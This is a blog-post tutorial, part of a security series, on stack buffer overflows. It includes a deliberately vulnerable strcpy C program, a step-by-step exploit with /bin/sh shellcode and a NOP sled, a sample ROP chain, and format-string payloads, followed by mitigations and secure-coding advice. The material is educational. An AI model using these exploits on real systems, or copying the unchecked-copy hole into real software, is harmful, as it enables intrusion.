---
layout: post
title: "Buffer Overflows: Breaking the Stack (Part 2)"
date: 2026-02-09 21:00:00 +0530
categories: [Cybersecurity, System Security]
tags: [buffer-overflow, stack, exploitation, memory-corruption, binary-exploitation]
image: /assets/images/sys-sec-bg.jpg
description: "Part 2 of the System Security Series. Understanding stack-based buffer overflows, shellcode injection, and modern mitigations."
author: Tharunaditya Anuganti
series: "System Security"
series_order: 2
series_description: "Deep dive into OS internals, memory protection, kernel exploitation defense, and secure architecture design."
---

# The Classic Attack

In Part 1, we explored Protection Rings and how the OS separates kernel from user space. But what happens when attackers don't need to attack the kernel directly? What if they can make a user-mode program do their bidding?

**Buffer Overflows** are among the oldest and most devastating vulnerability classes. Despite decades of mitigations, they still account for significant CVEs because they exploit a fundamental mismatch between how programmers think and how memory actually works.

---

## The Stack: A Quick Refresher

When a function is called, the CPU needs to remember:
*   Where to return after the function completes.
*   The function's local variables.
*   The function's parameters.

This information is stored on the **Stack**—a Last-In-First-Out (LIFO) data structure that grows downward in memory (on x86).

### Stack Frame Layout
```
High Memory Addresses
+------------------+
|   Parameters     |  (Passed by caller)
+------------------+
|   Return Address |  (Where to jump back)
+------------------+
|   Saved EBP      |  (Previous frame pointer)
+------------------+
|   Local Variables|  ← Buffer lives here
+------------------+
Low Memory Addresses (Stack grows down)
```

---

## What is a Buffer Overflow?

A buffer is a contiguous block of memory. When a program writes more data to a buffer than it can hold, the excess **overflows** into adjacent memory.

### Vulnerable Code Example

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

`strcpy()` copies until it hits a null terminator. If `input` is longer than 64 bytes, it overflows `buffer`.

### What Gets Overwritten?

```
Stack before overflow:
+------------------+
|   Return Address |  0x08048456
+------------------+
|   Saved EBP      |  0xbffff000
+------------------+
|   buffer[64]     |  "AAAA..." (64 bytes)
+------------------+

Stack after 80-byte input:
+------------------+
|   Return Address |  0x41414141 (AAAA)  ← OVERWRITTEN!
+------------------+
|   Saved EBP      |  0x41414141 (AAAA)  ← OVERWRITTEN!
+------------------+
|   buffer[64]     |  "AAAA..." (80 bytes)
+------------------+
```

When the function returns, the CPU tries to jump to `0x41414141`—an address we control!

---

## Exploiting Buffer Overflows

### Step 1: Find the Offset

We need to know exactly how many bytes to write before we hit the return address.

```bash
# Generate pattern
msf-pattern_create -l 200

# Crash the program with pattern
./vulnerable Aa0Aa1Aa2Aa3...

# Find offset from crash address
msf-pattern_offset -q 0x41366341
# Output: Exact match at offset 76
```

### Step 2: Control the Return Address

Now we know that bytes 77-80 overwrite the return address.

```python
# exploit.py
import struct

offset = 76
return_address = struct.pack("<I", 0xdeadbeef)  # Little-endian

payload = b"A" * offset + return_address
print(payload)
```

### Step 3: Inject Shellcode

We want to execute our own code. Classic approach: place shellcode in the buffer, then jump to it.

```python
# Shellcode to spawn /bin/sh (x86 Linux)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# NOP sled (landing zone)
nop_sled = b"\x90" * 100

# Buffer address (found via debugging)
buffer_addr = struct.pack("<I", 0xbffff500)

payload = nop_sled + shellcode + b"A" * (offset - len(nop_sled) - len(shellcode)) + buffer_addr
```

### Step 4: Execute

```bash
./vulnerable $(python exploit.py)
$ id
uid=0(root) gid=0(root)  # If running as root
```

---

## Modern Mitigations

### 1. Stack Canaries

A random value (canary) is placed before the return address. Before returning, the function checks if the canary was modified.

```
+------------------+
|   Return Address |
+------------------+
|   Canary         |  ← Random value, checked before return
+------------------+
|   Local Variables|
+------------------+
```

**Bypass:** Information leak to read canary, then include it in overflow.

### 2. DEP/NX (Data Execution Prevention)

Memory pages are marked either writable OR executable, not both.

*   Stack is writable (for variables) but NOT executable.
*   Shellcode in buffer won't execute.

**Bypass:** Return-Oriented Programming (ROP)—chain existing code gadgets.

### 3. ASLR (Address Space Layout Randomization)

Memory locations are randomized at runtime.

*   We can't hardcode buffer addresses.
*   Each run places stack/heap at different locations.

**Bypass:** Information leak, brute force (32-bit systems), or use fixed addresses (libraries without ASLR).

### 4. PIE (Position Independent Executable)

The program itself is loaded at random addresses.

**Bypass:** Similar to ASLR bypasses.

---

## Return-Oriented Programming (ROP)

When DEP prevents shellcode execution, we chain existing code snippets.

### ROP Gadgets

Small instruction sequences ending in `ret`:
```asm
pop eax; ret
pop ebx; ret
xor eax, eax; ret
mov [eax], ebx; ret
```

### Building a ROP Chain

Instead of jumping to shellcode, we return to a series of gadgets that set up registers and call `system("/bin/sh")`.

```python
from struct import pack

rop_chain = b""
rop_chain += pack("<I", 0x08048001)  # pop eax; ret
rop_chain += pack("<I", 0x0804a000)  # Address of "/bin/sh"
rop_chain += pack("<I", 0x08048002)  # pop ebx; ret
rop_chain += pack("<I", 0x00000000)  # 0
rop_chain += pack("<I", 0x080484f0)  # system@plt
```

Tools like **ROPgadget** and **ropper** automate gadget discovery.

---

## Heap Overflows

Not all overflows are on the stack. **Heap overflows** corrupt dynamically allocated memory.

*   More complex exploitation.
*   Target heap metadata to gain arbitrary write.
*   Techniques: House of Force, Fastbin Attack, Tcache Poisoning.

---

## Format String Vulnerabilities

Related class of memory corruption.

```c
printf(user_input);  // VULNERABLE
printf("%s", user_input);  // SAFE
```

Attack:
```bash
./vulnerable "%x.%x.%x.%x"  # Leak stack values
./vulnerable "%n%n%n%n"     # Write to memory
```

---

## Defending Against Buffer Overflows

### Secure Coding Practices
*   Use safe functions: `strncpy()`, `snprintf()`, `fgets()`
*   Validate all input lengths.
*   Use languages with bounds checking (Rust, Go).

### Compiler Protections
```bash
# Enable all protections
gcc -o program program.c -fstack-protector-all -pie -fPIE -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now
```

### Operating System
*   Enable ASLR: `echo 2 > /proc/sys/kernel/randomize_va_space`
*   Enable NX: Default on modern systems.

---

## Summary

*   **Buffer overflows** exploit the gap between buffer size and data written.
*   **Stack overflows** overwrite return addresses to hijack control flow.
*   **Mitigations**: Canaries, DEP/NX, ASLR, PIE.
*   **ROP** bypasses DEP by chaining existing code.
*   **Secure coding** is the ultimate defense.

**Next Part:** Once we're in, how do we go from user to root? **Privilege Escalation**.
